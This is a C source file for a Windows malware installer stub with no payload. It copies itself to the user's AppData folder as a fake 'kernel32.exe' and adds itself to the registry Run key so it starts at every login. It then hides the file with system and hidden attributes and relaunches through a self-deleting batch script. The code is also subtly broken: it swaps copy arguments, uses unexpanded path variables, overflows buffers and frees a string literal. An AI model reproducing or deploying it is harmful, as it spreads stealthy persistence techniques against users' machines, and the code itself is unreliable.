#include <Windows.h>
#include <stdio.h>

#define SUCCESS         0
#define ACCESS_DENAIED -1
#define ERR_IN_PROCESS  1

#define NEW_PATH        "%%APPDATA%%\\kernel32.exe"
#define REG_NAME        "kernel32"
#define START_K         "d"
#define SCRIPT_NAME     "script.bat"

char *getPath();
int  autorun(char*);
int  autoRun();
int Copy(char*, char*);
void restart();
void setup();

int main(int argc, char **argv) {
    if(argc != 2 && !strstr(argv[1], START_K))
        setup();
    // remove the bat file
    if (fopen(SCRIPT_NAME, "r"))
        remove(SCRIPT_NAME);
    // process
    return 0;
}

char *getPath() {
    char *PATH = (char*)malloc(MAX_PATH);
    GetModuleFileName(NULL, PATH, MAX_PATH);
    return PATH;
}

int autorun(char *sh) {
    HKEY hKey = NULL;
    LONG LRet = RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if(LRet != ERROR_SUCCESS)
        return LRet;
    LRet = RegSetValueEx(hKey, REG_NAME, 0, REG_SZ, (LPBYTE)sh, strlen(sh)+1);
    RegCloseKey(hKey);
    free(sh);
    return LRet;
}

int autoRun() {
	/* auto run script */
    // HKEY_CURRENT_USER
    char *path = getPath();
    char shell[] = "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v \""REG_NAME"\" /t REG_SZ /d \"";
    strcat(shell, path);
    strcat(shell, " "START_K"\""); // argc=2
    free(path);
    // Run & Handle
    FILE* fp = _popen(shell, "r");
    if (fp == NULL)
        // error with opening file
        return ERR_IN_PROCESS;
    
    char buffer[50];
    fgets(buffer, 50, fp);
    _pclose(fp);
    if (strstr(buffer, "successfuly"))
        // Done!
        return SUCCESS;
    else
        /* ACCESS DENAIED! */
        return ACCESS_DENAIED;
}

int Copy(char* src, char* dst) {
    FILE *in  = fopen(dst, "rb");
    FILE *out = fopen(src, "wb");

    if(in == NULL || out == NULL)
        return -1;

    char ch;
    while ((ch=getc(in)) != EOF)
        fputc(ch, out);
    fclose(in);
    fclose(out);
    return 0;
}

void restart() {
    FILE *bat = fopen(SCRIPT_NAME, "w");
    if(bat == NULL) {
        fprintf(bat, "timeout /t 3\n.\\kernel32.exe "START_K"\ndel /S /Q script.bat");
        fclose(bat);
        system("start "SCRIPT_NAME);
    } else
        system("timeout /t 3\n.\\kernel32.exe "START_K);
    exit(EXIT_SUCCESS);
}

void setup() {
    char *path = getPath();
    char *sh = "%%APPDATA%%\\kernel32.exe d";
    if(autorun(sh) != SUCCESS)
        autoRun();
    // copy & paste
    int ret;
    if(fopen("%%APPDATA%%\\kernel32.exe", "r") == NULL)
        ret = Copy(path, NEW_PATH);
    if(ret != SUCCESS) {
        char *shell = (char*)malloc(strlen(path) + 3);
        strcpy(shell, path);
        strcat(shell, " d\0");
        shell[strlen(path) + 3] = 0;
        if(autorun(shell) != SUCCESS)
            autoRun();
        free(shell);
    }
    // attrib
    char attr[] = "attrib +H +S +R ";
    strcat(attr, path);
    system(attr);
    // free allocated memory
    free(path);
    // restart and go to the next part
    restart();
}